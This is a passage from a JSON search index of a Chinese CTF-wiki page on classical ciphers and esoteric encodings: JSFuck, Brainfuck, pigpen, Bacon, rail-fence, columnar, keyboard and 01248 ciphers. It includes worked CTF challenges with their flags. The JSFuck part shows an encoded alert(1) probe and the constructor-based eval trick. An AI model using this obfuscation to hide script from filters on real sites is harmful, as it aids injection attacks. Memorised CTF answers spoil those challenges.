[])[ + [[ + []]]] + ([][[]] + [])[ + [[ !+ [] +!+ [] +!+ [] +!+ [] +!+ []]]] + ( ! [] + [])[ + [[ !+ [] +!+ []]]] + ( !! [] + [])[ + [[ + []]]] + ( !! [] + [])[ + [[ !+ [] +!+ [] +!+ []]]] + ( !! [] + [])[ + [[ +!+ []]]]][([][( ! [] + [])[ + [[ + []]]] + ([][[]] + [])[ + [[ !+ [] +!+ [] +!+ [] +!+ [] +!+ []]]] + ( ! [] + [])[ + [[ !+ [] +!+ []]]] + ( !! [] + [])[ + [[ + []]]] + ( !! [] + [])[ + [[ !+ [] +!+ [] +!+ []]]] + ( !! [] + [])[ + [[ +!+ []]]]] + [])[ + [[ !+ [] +!+ [] +!+ []]]] + ([][( ! [] + [])[ + [[ + []]]] + ([][[]] + [])[ + [[ !+ [] +!+ [] +!+ [] +!+ [] +!+ []]]] + ( ! [] + [])[ + [[ !+ [] +!+ []]]] + ( !! [] + [])[ + [[ + []]]] + ( !! [] + [])[ + [[ !+ [] +!+ [] +!+ []]]] + ( !! [] + [])[ + [[ +!+ []]]]] + [])[ + [[ !+ [] +!+ [] +!+ [] +!+ [] +!+ [] +!+ []]]] + ([][[]] + [])[ + [[ +!+ []]]] + ( ! [] + [])[ + [[ !+ [] +!+ [] +!+ []]]] + ( !! [] + [])[ + [[ + []]]] + ( !! [] + [])[ + [[ +!+ []]]] + ([][[]] + [])[ + [[ + []]]] + ([][( ! [] + [])[ + [[ + []]]] + ([][[]] + [])[ + [[ !+ [] +!+ [] +!+ [] +!+ [] +!+ []]]] + ( ! [] + [])[ + [[ !+ [] +!+ []]]] + ( !! [] + [])[ + [[ + []]]] + ( !! [] + [])[ + [[ !+ [] +!+ [] +!+ []]]] + ( !! [] + [])[ + [[ +!+ []]]]] + [])[ + [[ !+ [] +!+ [] +!+ []]]] + ( !! [] + [])[ + [[ + []]]] + ([][( ! [] + [])[ + [[ + []]]] + ([][[]] + [])[ + [[ !+ [] +!+ [] +!+ [] +!+ [] +!+ []]]] + ( ! [] + [])[ + [[ !+ [] +!+ []]]] + ( !! [] + [])[ + [[ + []]]] + ( !! [] + [])[ + [[ !+ [] +!+ [] +!+ []]]] + ( !! [] + [])[ + [[ +!+ []]]]] + [])[ + [[ !+ [] +!+ [] +!+ [] +!+ [] +!+ [] +!+ []]]] + ( !! [] + [])[ + [[ +!+ []]]]](( ! [] + [])[ + [[ +!+ []]]] + ( ! [] + [])[ + [[ !+ [] +!+ []]]] + ( !! [] + [])[ + [[ !+ [] +!+ [] +!+ []]]] + ( !! [] + [])[ + [[ +!+ []]]] + ( !! [] + [])[ + [[ + []]]] + ([][( ! [] + [])[ + [[ + []]]] + ([][[]] + [])[ + [[ !+ [] +!+ [] +!+ [] +!+ [] +!+ []]]] + ( ! [] + [])[ + [[ !+ [] +!+ []]]] + ( !! [] + [])[ + [[ + []]]] + ( !! [] + [])[ + [[ !+ [] +!+ [] +!+ []]]] + ( !! [] + [])[ + [[ +!+ []]]]] + [])[ + [[ +!+ []]] + [[ !+ [] +!+ [] +!+ [] +!+ [] +!+ []]]] + [ +!+ []] + ([][( ! [] + [])[ + [[ + []]]] + ([][[]] + [])[ + [[ !+ [] +!+ [] +!+ [] +!+ [] +!+ []]]] + ( ! [] + [])[ + [[ !+ [] +!+ []]]] + ( !! [] + [])[ + [[ + []]]] + ( !! [] + [])[ + [[ !+ [] +!+ [] +!+ []]]] + ( !! [] + [])[ + [[ +!+ []]]]] + [])[ + [[ +!+ []]] + [[ !+ [] +!+ [] +!+ [] +!+ [] +!+ [] +!+ []]]])() \u5176\u4ed6\u4e00\u4e9b\u57fa\u672c\u7684\u8868\u8fbe\uff1a false => ! [] true => !! [] undefined => [][[]] NaN => + [ ! []] 0 => + [] 1 => +!+ [] 2 => !+ [] +!+ [] 10 => [ +!+ []] + [ + []] Array => [] Number => + [] String => [] + [] Boolean => ! [] Function => [][ \"filter\" ] eval => [][ \"filter\" ][ \"constructor\" ]( CODE )() window => [][ \"filter\" ][ \"constructor\" ]( \"return this\" )() \u5de5\u5177 \u00b6 JSFuck \u5728\u7ebf\u52a0\u5bc6\u7f51\u7ad9 BrainFuck \u00b6 \u539f\u7406 \u00b6 Brainfuck\uff0c\u662f\u4e00\u79cd\u6781\u5c0f\u5316\u7684\u8ba1\u7b97\u673a\u8bed\u8a00\uff0c\u5b83\u662f\u7531 Urban M\u00fcller \u5728 1993 \u5e74\u521b\u5efa\u7684\u3002\u6211\u4eec\u4e3e\u4e00\u4e2a\u4f8b\u5b50\uff0c\u5982\u679c\u6211\u4eec\u60f3\u8981\u4e00\u4e2a\u5728\u5c4f\u5e55\u4e0a\u6253\u5370Hello World\uff01\uff0c\u90a3\u4e48\u5bf9\u5e94\u7684\u7a0b\u5e8f\u5982\u4e0b\u3002\u5bf9\u4e8e\u5176\u4e2d\u7684\u539f\u7406\uff0c\u611f\u5174\u8da3\u7684\u53ef\u4ee5\u81ea\u884c\u7f51\u4e0a\u641c\u7d22\u3002 ++++++++++[>+++++++>++++++++++>+++>+<<<<-] >++.>+.+++++++..+++.>++.<<+++++++++++++++. >.+++.------.--------.>+.>. \u4e0e\u5176\u5bf9\u5e94\u7684\u8fd8\u6709 ook\u3002 \u5de5\u5177 \u00b6 https://www.splitbrain.org/services/ook \u732a\u5708\u5bc6\u7801 \u00b6 \u539f\u7406 \u00b6 \u732a\u5708\u5bc6\u7801\u662f\u4e00\u79cd\u4ee5\u683c\u5b50\u4e3a\u57fa\u7840\u7684\u7b80\u5355\u66ff\u4ee3\u5f0f\u5bc6\u7801\uff0c\u683c\u5b50\u5982\u4e0b \u6211\u4eec\u4e3e\u4e00\u4e2a\u4f8b\u5b50\uff0c\u5982\u660e\u6587\u4e3a X marks the spot \uff0c\u90a3\u4e48\u5bc6\u6587\u5982\u4e0b \u5de5\u5177 \u00b6 http://www.simonsingh.net/The_Black_Chamber/pigpen.html \u821e\u52a8\u7684\u5c0f\u4eba\u5bc6\u7801 \u00b6 \u539f\u7406 \u00b6 \u8fd9\u79cd\u5bc6\u7801\u51fa\u81ea\u4e8e\u798f\u5c14\u6469\u65af\u63a2\u6848\u96c6\u3002\u6bcf\u4e00\u4e2a\u8df3\u821e\u7684\u5c0f\u4eba\u5b9e\u9645\u4e0a\u5bf9\u5e94\u7684\u662f\u82f1\u6587\u4e8c\u5341\u516d\u4e2a\u5b57\u6bcd\u4e2d\u7684\u4e00\u4e2a\uff0c\u800c\u5c0f\u4eba\u624b\u4e2d\u7684\u65d7\u5b50\u5219\u8868\u660e\u8be5\u5b57\u6bcd\u662f\u5355\u8bcd\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u6bcd\uff0c\u5982\u679c\u4ec5\u4ec5\u662f\u4e00\u4e2a\u5355\u8bcd\u800c\u4e0d\u662f\u53e5\u5b50\uff0c\u6216\u8005\u662f\u53e5\u5b50\u4e2d\u6700\u540e\u7684\u4e00\u4e2a\u5355\u8bcd\uff0c\u5219\u5355\u8bcd\u4e2d\u6700\u540e\u4e00\u4e2a\u5b57\u6bcd\u4e0d\u5fc5\u4e3e\u65d7\u3002 \u952e\u76d8\u5bc6\u7801 \u00b6 \u6240\u8c13\u952e\u76d8\u5bc6\u7801\uff0c\u5c31\u662f\u91c7\u7528\u624b\u673a\u952e\u76d8\u6216\u8005\u7535\u8111\u952e\u76d8\u8fdb\u884c\u52a0\u5bc6\u3002 \u624b\u673a\u952e\u76d8\u5bc6\u7801 \u00b6 \u624b\u673a\u952e\u76d8\u52a0\u5bc6\u65b9\u5f0f\uff0c\u662f\u6bcf\u4e2a\u6570\u5b57\u952e\u4e0a\u6709 3-4 \u4e2a\u5b57\u6bcd\uff0c\u7528\u4e24\u4f4d\u6570\u5b57\u6765\u8868\u793a\u5b57\u6bcd\uff0c\u4f8b\u5982\uff1aru \u7528\u624b\u673a\u952e\u76d8\u8868\u793a\u5c31\u662f\uff1a7382\uff0c\u90a3\u4e48\u8fd9\u91cc\u5c31\u53ef\u4ee5\u77e5\u9053\u4e86\uff0c\u624b\u673a\u952e\u76d8\u52a0\u5bc6\u65b9\u5f0f\u4e0d\u53ef\u80fd\u7528 1 \u5f00\u5934\uff0c\u7b2c\u4e8c\u4f4d\u6570\u5b57\u4e0d\u53ef\u80fd\u8d85\u8fc7 4\uff0c\u89e3\u5bc6\u7684\u65f6\u5019\u53c2\u8003\u6b64 \u5173\u4e8e\u624b\u673a\u952e\u76d8\u52a0\u5bc6\u8fd8\u6709\u53e6\u4e00\u79cd\u65b9\u5f0f\uff0c\u5c31\u662f\u300c\u97f3\u7684\u300d\u5f0f\uff08\u8fd9\u4e00\u70b9\u53ef\u80fd\u6839\u636e\u624b\u673a\u7684\u4e0d\u540c\u4f1a\u6709\u6240\u4e0d\u540c\uff09\uff0c\u5177\u4f53\u53c2\u7167\u624b\u673a\u952e\u76d8\u6765\u6253\uff0c\u4f8b\u5982\uff1a\u300c\u6570\u5b57\u300d\u8868\u793a\u51fa\u6765\u5c31\u662f\uff1a748 94\u3002\u5728\u624b\u673a\u952e\u76d8\u4e0a\u9762\u6309\u4e0b\u8fd9\u51e0\u4e2a\u6570\uff0c\u5c31\u4f1a\u51fa\uff1a\u300c\u6570\u5b57\u300d\u7684\u62fc\u97f3\u3002 \u7535\u8111\u952e\u76d8\u68cb\u76d8 \u00b6 \u7535\u8111\u952e\u76d8\u68cb\u76d8\u52a0\u5bc6\uff0c\u5229\u7528\u4e86\u7535\u8111\u7684\u68cb\u76d8\u65b9\u9635\u3002 \u7535\u8111\u952e\u76d8\u5750\u6807 \u00b6 \u7535\u8111\u952e\u76d8\u5750\u6807\u52a0\u5bc6\uff0c\u5229\u7528\u952e\u76d8\u4e0a\u9762\u7684\u5b57\u6bcd\u884c\u548c\u6570\u5b57\u884c\u6765\u52a0\u5bc6\uff0c\u4f8b\uff1abye \u7528\u7535\u8111\u952e\u76d8 XY \u8868\u793a\u5c31\u662f\uff1a351613 \u7535\u8111\u952e\u76d8 QWE \u00b6 \u7535\u8111\u952e\u76d8 QWE \u52a0\u5bc6\u6cd5\uff0c\u5c31\u662f\u7528\u5b57\u6bcd\u8868\u66ff\u6362\u952e\u76d8\u4e0a\u9762\u7684\u6392\u5217\u987a\u5e8f\u3002 \u952e\u76d8\u5e03\u5c40\u52a0\u5bc6 \u00b6 \u7b80\u5355\u5730\u8bf4\u5c31\u662f\u6839\u636e\u7ed9\u5b9a\u7684\u5b57\u7b26\u5728\u952e\u76d8\u4e0a\u7684\u6837\u5b50\u6765\u8fdb\u884c\u52a0\u5bc6\u3002 0CTF 2014 classic \u00b6 \u5c0f\u4e01\u4e01\u53d1\u73b0\u81ea\u5df1\u7f6e\u8eab\u4e8e\u4e00\u4e2a\u8be1\u5f02\u7684\u623f\u95f4\uff0c\u9762\u524d\u53ea\u6709\u4e00\u6247\u523b\u7740\u5947\u602a\u5b57\u7b26\u7684\u95e8\u3002 \u4ed6\u53d1\u73b0\u95e8\u8fb9\u4e0a\u8fd8\u6709\u4e00\u9053\u5bc6\u7801\u9501\uff0c\u4f3c\u4e4e\u8981\u8f93\u5165\u5bc6\u7801\u624d\u80fd\u5f00\u95e8\u3002\u30024esxcft5 rdcvgt 6tfc78uhg 098ukmnb \u53d1\u73b0\u8fd9\u4e48\u4e71\uff0c\u8fd8\u540c\u65f6\u5305\u62ec\u6570\u5b57\u548c\u5b57\u6bcd\u731c\u60f3\u53ef\u80fd\u662f\u952e\u76d8\u5bc6\u7801\uff0c\u8bd5\u7740\u5728\u952e\u76d8\u4e0a\u6309\u7167\u5b57\u6bcd\u987a\u5e8f\u63cf\u7ed8\u4e00\u4e0b\uff0c\u53ef\u5f97\u52300ops\u5b57\u6837\uff0c\u731c\u6d4b\u5c31\u662fflag\u4e86\u3002 2017\u5e74xman\u9009\u62d4\u8d5b\u2014\u2014\u4e00\u4e8c\u4e09\uff0c\u6728\u5934\u4eba \u00b6 \u6211\u6570123\u6728\u5934\u4eba\uff0c\u518d\u4e0d\u884c\u52a8\u5c31\u8981\u88ab\u6263\u5206\u3002 23731263111628163518122316391715262121 \u5bc6\u7801\u683c\u5f0fxman{flag} \u9898\u76ee\u4e2d\u6709\u5f88\u660e\u663e\u7684\u63d0\u793a123\uff0c\u90a3\u4e48\u5c31\u81ea\u7136\u9700\u8981\u8054\u60f3\u5230\u952e\u76d8\u5bc6\u7801\u4e2d\u7535\u8111\u952e\u76d8\u5750\u6807\u5bc6\u7801\uff0c\u53ef\u4ee5\u53d1\u73b0\u524d\u51e0\u4e2a\u6570\u5b57\u7b2c\u4e8c\u4e2a\u6570\u5b57\u90fd\u662f1-3\u8303\u56f4\u5185\u7684\uff0c\u4e5f\u9a8c\u8bc1\u4e86\u6211\u4eec\u7684\u731c\u6d4b\u3002\u4e8e\u662f 23-x 73-m 12-a 63-n 11-q \u4e0d\u5bf9\u5440\uff0c\u5bc6\u7801\u683c\u5f0f\u662f xman{ \uff0c\u7b2c\u56db\u4e2a\u5b57\u7b26\u662f { \uff0c\u4e8e\u662f\u770b\u4e86\u770b { \u7684\u4f4d\u7f6e\uff0c\u5176\u5e76\u6ca1\u6709\u5bf9\u5e94\u7684\u6a2a\u5750\u6807\uff0c\u4f46\u662f\u5982\u679c\u6211\u4eec\u624b\u52a8\u628a\u5b83\u89c6\u4e3a 11 \u7684\u8bdd\uff0c\u90a3\u4e48111\u5c31\u662f { \u3002\u7136\u540e\u4f9d\u6b21\u5f80\u540e\u63a8\uff0c\u53d1\u73b0\u786e\u5b9e\u53ef\u884c\uff0c\uff0c\u6700\u540e\u518d\u628a 121 \u89c6\u4e3a } \u5373\u53ef\u5f97\u5230 flag\u3002 xman{hintisenough} \u4ece\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\uff0c\u6211\u4eec\u8fd8\u662f\u8981\u6ce8\u610f\u8fc1\u79fb\u6027\uff0c\u4e0d\u80fd\u5355\u7eaf\u5730\u7167\u642c\u4e00\u4e9b\u5df2\u6709\u7684\u77e5\u8bc6\u3002 \u9898\u76ee \u00b6 \u5b9e\u9a8c\u5427 \u5947\u602a\u7684\u77ed\u4fe1","title":"\u5176\u4ed6\u7c7b\u578b\u52a0\u5bc6"},{"location":"crypto/classical/others/#_1","text":"","title":"\u57f9\u6839\u5bc6\u7801"},{"location":"crypto/classical/others/#_2","text":"\u57f9\u6839\u5bc6\u7801\u4f7f\u7528\u4e24\u79cd\u4e0d\u540c\u7684\u5b57\u4f53\uff0c\u4ee3\u8868 A \u548c B\uff0c\u7ed3\u5408\u52a0\u5bc6\u8868\u8fdb\u884c\u52a0\u89e3\u5bc6\u3002 a AAAAA g AABBA n ABBAA t BAABA b AAAAB h AABBB o ABBAB u-v BAABB c AAABA i-j ABAAA p ABBBA w BABAA d AAABB k ABAAB q ABBBB x BABAB e AABAA l ABABA r BAAAA y BABBA f AABAB m ABABB s BAAAB z BABBB \u4e0a\u9762\u7684\u662f\u5e38\u7528\u7684\u52a0\u5bc6\u8868\u3002\u8fd8\u6709\u53e6\u5916\u7684\u4e00\u79cd\u52a0\u5bc6\u8868\uff0c\u53ef\u8ba4\u4e3a\u662f\u5c06 26 \u4e2a\u5b57\u6bcd\u4ece 0 \u5230 25 \u6392\u5e8f\uff0c\u4ee5\u4e8c\u8fdb\u5236\u8868\u793a\uff0cA \u4ee3\u8868 0\uff0cB \u4ee3\u8868 1\u3002 \u4e0b\u9762\u8fd9\u4e00\u6bb5\u5185\u5bb9\u5c31\u662f\u660e\u6587 steganography \u52a0\u5bc6\u540e\u7684\u5185\u5bb9\uff0c\u6b63\u5e38\u5b57\u4f53\u662f A\uff0c\u7c97\u4f53\u662f B\uff1a T o en co de a mes s age e ac h letter of the pl a i nt ex t i s replaced b y a g rou p of f i ve of th e lett ers 'A' o r 'B' . \u53ef\u4ee5\u770b\u5230\uff0c\u57f9\u6839\u5bc6\u7801\u4e3b\u8981\u6709\u4ee5\u4e0b\u7279\u70b9 \u53ea\u6709\u4e24\u79cd\u5b57\u7b26 \u6bcf\u4e00\u6bb5\u7684\u957f\u5ea6\u4e3a 5 \u52a0\u5bc6\u5185\u5bb9\u4f1a\u6709\u7279\u6b8a\u7684\u5b57\u4f53\u4e4b\u5206\uff0c\u4ea6\u6216\u8005\u5927\u5c0f\u5199\u4e4b\u5206\u3002","title":"\u539f\u7406"},{"location":"crypto/classical/others/#_3","text":"http://rumkin.com/tools/cipher/baconian.php","title":"\u5de5\u5177"},{"location":"crypto/classical/others/#_4","text":"","title":"\u6805\u680f\u5bc6\u7801"},{"location":"crypto/classical/others/#_5","text":"\u6805\u680f\u5bc6\u7801\u628a\u8981\u52a0\u5bc6\u7684\u660e\u6587\u5206\u6210 N \u4e2a\u4e00\u7ec4\uff0c\u7136\u540e\u628a\u6bcf\u7ec4\u7684\u7b2c 1 \u4e2a\u5b57\u8fde\u8d77\u6765\uff0c\u5f62\u6210\u4e00\u6bb5\u65e0\u89c4\u5f8b\u7684\u8bdd\u3002\u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50 \u660e\u6587\uff1aTHERE IS A CIPHER \u53bb\u6389\u7a7a\u683c\u540e\u53d8\u4e3a THEREISACIPHER \u5206\u6210\u4e24\u680f\uff0c\u4e24\u4e2a\u4e00\u7ec4\u5f97\u5230 TH ER EI SA CI PH ER \u5148\u53d6\u51fa\u7b2c\u4e00\u4e2a\u5b57\u6bcd\uff0c\u518d\u53d6\u51fa\u7b2c\u4e8c\u4e2a\u5b57\u6bcd TEESCPE HRIAIHR \u8fde\u5728\u4e00\u8d77\u5c31\u662f TEESCPEHRIAIHR \u4e0a\u8ff0\u660e\u6587\u4e5f\u53ef\u4ee5\u5206\u4e3a2\u680f\u3002 THEREIS ACIPHER \u7ec4\u5408\u5f97\u5230\u5bc6\u6587 TAHCEIRPEHIESR","title":"\u539f\u7406"},{"location":"crypto/classical/others/#_6","text":"\u5f85\u8865\u5145\u3002","title":"\u5de5\u5177"},{"location":"crypto/classical/others/#_7","text":"","title":"\u66f2\u8def\u5bc6\u7801"},{"location":"crypto/classical/others/#_8","text":"\u66f2\u8def\u5bc6\u7801\uff08Curve Cipher\uff09\u662f\u4e00\u79cd\u6362\u4f4d\u5bc6\u7801\uff0c\u9700\u8981\u4e8b\u5148\u53cc\u65b9\u7ea6\u5b9a\u5bc6\u94a5\uff08\u4e5f\u5c31\u662f\u66f2\u8def\u8def\u5f84\uff09\u3002\u4e0b\u9762\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50 \u660e\u6587\uff1aThe quick brown fox jumps over the lazy dog \u586b\u5165 5 \u884c 7 \u5217\u8868\uff08\u4e8b\u5148\u7ea6\u5b9a\u586b\u5145\u7684\u884c\u5217\u6570\uff09 \u52a0\u5bc6\u7684\u56de\u8def\u7ebf\uff08\u4e8b\u5148\u7ea6\u5b9a\u586b\u5145\u7684\u884c\u5217\u6570\uff09 \u5bc6\u6587\uff1agesfc inpho dtmwu qoury zejre hbxva lookT","title":"\u539f\u7406"},{"location":"crypto/classical/others/#_9","text":"","title":"\u5217\u79fb\u4f4d\u52a0\u5bc6"},{"location":"crypto/classical/others/#_10","text":"\u5217\u79fb\u4f4d\u5bc6\u7801\uff08Columnar Transposition Cipher\uff09\u662f\u4e00\u79cd\u6bd4\u8f83\u7b80\u5355\uff0c\u6613\u4e8e\u5b9e\u73b0\u7684\u6362\u4f4d\u5bc6\u7801\uff0c\u901a\u8fc7\u4e00\u4e2a\u7b80\u5355\u7684\u89c4\u5219\u5c06\u660e\u6587\u6253\u4e71\u6df7\u5408\u6210\u5bc6\u6587\u3002\u4e0b\u9762\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50\u3002 \u6211\u4eec\u4ee5\u660e\u6587 The quick brown fox jumps over the lazy dog \uff0c\u5bc6\u94a5 how are u \u4e3a\u4f8b\uff1a \u5c06\u660e\u6587\u586b\u5165 5 \u884c 7 \u5217\u8868\uff08\u4e8b\u5148\u7ea6\u5b9a\u586b\u5145\u7684\u884c\u5217\u6570\uff0c\u5982\u679c\u660e\u6587\u4e0d\u80fd\u586b\u5145\u5b8c\u8868\u683c\u53ef\u4ee5\u7ea6\u5b9a\u4f7f\u7528\u67d0\u4e2a\u5b57\u6bcd\u8fdb\u884c\u586b\u5145\uff09 \u5bc6\u94a5\uff1a how are u \uff0c\u6309 how are u \u5728\u5b57\u6bcd\u8868\u4e2d\u7684\u51fa\u73b0\u7684\u5148\u540e\u987a\u5e8f\u8fdb\u884c\u7f16\u53f7\uff0c\u6211\u4eec\u5c31\u6709 a \u4e3a 1\uff0ce \u4e3a 2\uff0ch \u4e3a 3\uff0co \u4e3a 4\uff0cr \u4e3a 5\uff0cu \u4e3a 6\uff0cw \u4e3a 7\uff0c\u6240\u4ee5\u5148\u5199\u51fa a \u5217\uff0c\u5176\u6b21 e \u5217\uff0c\u4ee5\u6b64\u7c7b\u63a8\u5199\u51fa\u7684\u7ed3\u679c\u4fbf\u662f\u5bc6\u6587\uff1a \u5bc6\u6587\uff1a qoury inpho Tkool hbxva uwmtd cfseg erjez","title":"\u539f\u7406"},{"location":"crypto/classical/others/#_11","text":"http://www.practicalcryptography.com/ciphers/classical-era/columnar-transposition/ \u884c\u5217\u6570\u76f8\u7b49","title":"\u5de5\u5177"},{"location":"crypto/classical/others/#01248","text":"","title":"01248 \u5bc6\u7801"},{"location":"crypto/classical/others/#_12","text":"\u8be5\u5bc6\u7801\u53c8\u79f0\u4e3a\u4e91\u5f71\u5bc6\u7801\uff0c\u4f7f\u7528 0\uff0c1\uff0c2\uff0c4\uff0c8 \u56db\u4e2a\u6570\u5b57\uff0c\u5176\u4e2d 0 \u7528\u6765\u8868\u793a\u95f4\u9694\uff0c\u5176\u4ed6\u6570\u5b57\u4ee5\u52a0\u6cd5\u53ef\u4ee5\u8868\u793a\u51fa \u5982\uff1a28=10\uff0c124=7\uff0c18=9\uff0c\u518d\u7528 1->26 \u8868\u793a A->Z\u3002 \u53ef\u4ee5\u770b\u51fa\u8be5\u5bc6\u7801\u6709\u4ee5\u4e0b\u7279\u70b9 \u53ea\u6709 0\uff0c1\uff0c2\uff0c4\uff0c8","title":"\u539f\u7406"},{"location":"crypto/classical/others/#_13","text":"\u8fd9\u91cc\u6211\u4eec\u4ee5CFF 2016 \u5f71\u4e4b\u5bc6\u7801\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u9898\u76ee 8842101220480224404014224202480122 \u6211\u4eec\u6309\u71670\u6765\u8fdb\u884c\u5206\u5272\uff0c\u5982\u4e0b \u5185\u5bb9 \u6570\u5b57 \u5b57\u7b26 88421 8+8+4+2+1=23 W 122 1+2+2=5 E 48 4+8=12 L 2244 2+2+4+4=12 L 4 4 D 142242 1+4+2+2+4+2=15 O 248 2+4+8=14 N 122 1+2+2=5 E \u6240\u4ee5\u6700\u540e\u7684 flag \u4e3a WELLDONE\u3002","title":"\u4f8b\u5b50"},{"location":"crypto/classical/others/#jsfuck","text":"","title":"JSFuck"},{"location":"crypto/classical/others/#_14","text":"JSFuck \u53ef\u4ee5\u53ea\u7528 6 \u4e2a\u5b57\u7b26 []()!+ \u6765\u7f16\u5199 JavaScript \u7a0b\u5e8f\u3002\u6bd4\u5982\u6211\u4eec\u60f3\u7528 JSFuck \u6765\u5b9e\u73b0 alert(1) \u4ee3\u7801\u5982\u4e0bu5176\u4ed6\u4e00\u4e9b\u57fa\u672c\u7684\u8868\u8fbe\uff1a false => ! [] true => !! [] undefined => [][[]] NaN => + [ ! []] 0 => + [] 1 => +!+ [] 2 => !+ [] +!+ [] 10 => [ +!+ []] + [ + []] Array => [] Number => + [] String => [] + [] Boolean => ! [] Function => [][ \"filter\" ] eval => [][ \"filter\" ][ \"constructor\" ]( CODE )() window => [][ \"filter\" ][ \"constructor\" ]( \"return this\" )()","title":"\u539f\u7406"},{"location":"crypto/classical/others/#_15","text":"JSFuck \u5728\u7ebf\u52a0\u5bc6\u7f51\u7ad9","title":"\u5de5\u5177"},{"location":"crypto/classical/others/#brainfuck","text":"","title":"BrainFuck"},{"location":"crypto/classical/others/#_16","text":"Brainfuck\uff0c\u662f\u4e00\u79cd\u6781\u5c0f\u5316\u7684\u8ba1\u7b97\u673a\u8bed\u8a00\uff0c\u5b83\u662f\u7531 Urban M\u00fcller \u5728 1993 \u5e74\u521b\u5efa\u7684\u3002\u6211\u4eec\u4e3e\u4e00\u4e2a\u4f8b\u5b50\uff0c\u5982\u679c\u6211\u4eec\u60f3\u8981\u4e00\u4e2a\u5728\u5c4f\u5e55\u4e0a\u6253\u5370Hello World\uff01\uff0c\u90a3\u4e48\u5bf9\u5e94\u7684\u7a0b\u5e8f\u5982\u4e0b\u3002\u5bf9\u4e8e\u5176\u4e2d\u7684\u539f\u7406\uff0c\u611f\u5174\u8da3\u7684\u53ef\u4ee5\u81ea\u884c\u7f51\u4e0a\u641c\u7d22\u3002 ++++++++++[>+++++++>++++++++++>+++>+<<<<-] >++.>+.+++++++..+++.>++.<<+++++++++++++++. >.+++.------.--------.>+.>. \u4e0e\u5176\u5bf9\u5e94\u7684\u8fd8\u6709 ook\u3002","title":"\u539f\u7406"},{"location":"crypto/classical/others/#_17","text":"https://www.splitbrain.org/services/ook","title":"\u5de5\u5177"},{"location":"crypto/classical/others/#_18","text":"","title":"\u732a\u5708\u5bc6\u7801"},{"location":"crypto/classical/others/#_19","text":"\u732a\u5708\u5bc6\u7801\u662f\u4e00\u79cd\u4ee5\u683c\u5b50\u4e3a\u57fa\u7840\u7684\u7b80\u5355\u66ff\u4ee3\u5f0f\u5bc6\u7801\uff0c\u683c\u5b50\u5982\u4e0b \u6211\u4eec\u4e3e\u4e00\u4e2a\u4f8b\u5b50\uff0c\u5982\u660e\u6587\u4e3a X marks the spot \uff0c\u90a3\u4e48\u5bc6\u6587\u5982\u4e0b","title":"\u539f\u7406"},{"location":"crypto/classical/others/#_20","text":"http://www.simonsingh.net/The_Black_Chamber/pigpen.html","title":"\u5de5\u5177"},{"location":"crypto/classical/others/#_21","text":"","title":"\u821e\u52a8\u7684\u5c0f\u4eba\u5bc6\u7801"},{"location":"crypto/classical/others/#_22","text":"\u8fd9\u79cd\u5bc6\u7801\u51fa\u81ea\u4e8e\u798f\u5c14\u6469\u65af\u63a2\u6848\u96c6\u3002\u6bcf\u4e00\u4e2a\u8df3\u821e\u7684\u5c0f\u4eba\u5b9e\u9645\u4e0a\u5bf9\u5e94\u7684\u662f\u82f1\u6587\u4e8c\u5341\u516d\u4e2a\u5b57\u6bcd\u4e2d\u7684\u4e00\u4e2a\uff0c\u800c\u5c0f\u4eba\u624b\u4e2d\u7684\u65d7\u5b50\u5219\u8868\u660e\u8be5\u5b57\u6bcd\u662f\u5355\u8bcd\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u6bcd\uff0c\u5982\u679c\u4ec5\u4ec5\u662f\u4e00\u4e2a\u5355\u8bcd\u800c\u4e0d\u662f\u53e5\u5b50\uff0c\u6216\u8005\u662f\u53e5\u5b50\u4e2d\u6700\u540e\u7684\u4e00\u4e2a\u5355\u8bcd\uff0c\u5219\u5355\u8bcd\u4e2d\u6700\u540e\u4e00\u4e2a\u5b57\u6bcd\u4e0d\u5fc5\u4e3e\u65d7\u3002","title":"\u539f\u7406"},{"location":"crypto/classical/others/#_23","text":"\u6240\u8c13\u952e\u76d8\u5bc6\u7801\uff0c\u5c31\u662f\u91c7\u7528\u624b\u673a\u952e\u76d8\u6216\u8005\u7535\u8111\u952e\u76d8\u8fdb\u884c\u52a0\u5bc6\u3002","title":"\u952e\u76d8\u5bc6\u7801"},{"location":"crypto/classical/others/#_24","text":"\u624b\u673a\u952e\u76d8\u52a0\u5bc6\u65b9\u5f0f\uff0c\u662f\u6bcf\u4e2a\u6570\u5b57\u952e\u4e0a\u6709 3-4 \u4e2a\u5b57\u6bcd\uff0c\u7528\u4e24\u4f4d\u6570\u5b57\u6765\u8868\u793a\u5b57\u6bcd\uff0c\u4f8b\u5982\uff1aru \u7528\u624b\u673a\u952e\u76d8\u8868\u793a\u5c31\u662f\uff1a7382\uff0c\u90a3\u4e48\u8fd9\u91cc\u5c31\u53ef\u4ee5\u77e5\u9053\u4e86\uff0c\u624b\u673a\u952e\u76d8\u52a0\u5bc6\u65b9\u5f0f\u4e0d\u53ef\u80fd\u7528 1 \u5f00\u5934\uff0c\u7b2c\u4e8c\u4f4d\u6570\u5b57\u4e0d\u53ef\u80fd\u8d85\u8fc7 4\uff0c\u89e3\u5bc6\u7684\u65f6\u5019\u53c2\u8003\u6b64 \u5173\u4e8e\u624b\u673a\u952e\u76d8\u52a0\u5bc6\u8fd8\u6709\u53e6\u4e00\u79cd\u65b9\u5f0f\uff0c\u5c31\u662f\u300c\u97f3\u7684\u300d\u5f0f\uff08\u8fd9\u4e00\u70b9\u53ef\u80fd\u6839\u636e\u624b\u673a\u7684\u4e0d\u540c\u4f1a\u6709\u6240\u4e0d\u540c\uff09\uff0c\u5177\u4f53\u53c2\u7167\u624b\u673a\u952e\u76d8\u6765\u6253\uff0c\u4f8b\u5982\uff1a\u300c\u6570\u5b57\u300d\u8868\u793a\u51fa\u6765\u5c31\u662f\uff1a748 